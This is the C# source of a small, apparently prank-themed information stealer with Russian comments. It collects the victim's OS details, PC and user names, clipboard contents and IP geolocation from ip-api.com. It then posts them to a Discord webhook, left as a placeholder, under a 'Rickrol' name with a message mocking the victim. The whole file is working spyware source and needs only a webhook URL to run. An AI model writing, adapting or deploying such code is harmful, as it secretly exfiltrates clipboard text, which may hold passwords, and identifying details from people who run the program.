using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.Encodings.Web;
using System.Text.Json;
using System.Text.Unicode;
using System.Threading.Tasks;
using System.Windows.Documents;
using System.Windows.Documents.DocumentStructures;
using System.Windows.Forms;
namespace CMD_Csharp_EDITION
{
    internal class Program
    {
        static HttpClient httpClient = new HttpClient();
        static HttpClient httpClient_ip = new HttpClient();
        [STAThread]
        static async Task Main(string[] args)
        {

            Dictionary<string, string> systemInfo = new Dictionary<string, string>();

            systemInfo.Add("OS_INFO", Environment.OSVersion.ToString()); // Windows 10 12.4.16.2.0
            systemInfo.Add("PC_NAME", Environment.MachineName);
            systemInfo.Add("USER", Environment.UserName); // Pro_gamer123 (name of user windows)

            Thread thread = new Thread(() =>
            {
                switch (Clipboard.ContainsText())
                {
                    case true:
                        systemInfo.Add("CLIPBOARD_TEXT", Clipboard.GetText());
                        break;

                    case false:
                        systemInfo.Add("CLIPBOARD_TEXT", "[THERE IS NO TEXT OR IT'S NOT A TEXT]");
                        break;
                }
            }); // Проверка буфера вынесена в отдельный статичный поток (можно увидеть ниже) иначе бы условие всегда возвращало false

            thread.SetApartmentState(ApartmentState.STA); // Установка режима
            thread.Start();
            thread.Join(); // Ждем завершения потока

            systemInfo.Add("ARCHITECTURE", RuntimeInformation.OSArchitecture.ToString()); //X86

            systemInfo.Add("PROCESSOR_COUNT", Environment.ProcessorCount.ToString()); //Ядра процессора

            using var request_ip = new HttpRequestMessage(HttpMethod.Get, "http://ip-api.com/json/?lang=ru&fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query");

            using var response_ip = await httpClient_ip.SendAsync(request_ip);
            string responseIP_text = await response_ip.Content.ReadAsStringAsync();

            Console.WriteLine(responseIP_text);

            var jsonElement = JsonSerializer.Deserialize<JsonElement>(responseIP_text);
            string prettyJson = JsonSerializer.Serialize(jsonElement, new JsonSerializerOptions
            {
                WriteIndented = true,
                Encoder = JavaScriptEncoder.Create(UnicodeRanges.BasicLatin, UnicodeRanges.Cyrillic)
            });


            string payload = $"""
                ## Чел попался на рикрол :woman_in_manual_wheelchair: :pig2:

                *Информация об IP:*
                ```{prettyJson}```
                
                ### Системная информация :computer:
                Имя ОС: {systemInfo["OS_INFO"]}
                Архитектура процессора: {systemInfo["ARCHITECTURE"]}
                Ядер процессора: {systemInfo["PROCESSOR_COUNT"]}
                
                Имя ПК\\Пользователя: `{systemInfo["PC_NAME"]}\{systemInfo["USER"]}`
                
                *Содержимое буфера обмена:* ```{systemInfo["CLIPBOARD_TEXT"]}```
                
                """;

            var jsonObject = new
            {
                content = payload,
                username = "Rickrol",
                avatar_url = "https://jollycontrarian.com/images/6/6c/Rickroll.jpg?20170403162336"
            };

            string json = JsonSerializer.Serialize(jsonObject);

            StringContent content = new StringContent(json, Encoding.UTF8, "application/json");

            using var request = new HttpRequestMessage(HttpMethod.Post, "DISCORD_WEEBHOOK_HERE");
            request.Content = content;

            try
            {
                using var response = await httpClient.SendAsync(request);
                string responseText = await response.Content.ReadAsStringAsync();
                Environment.Exit(0);
             }
            catch
            {
                Environment.Exit(1);
            }





        }
    }
}
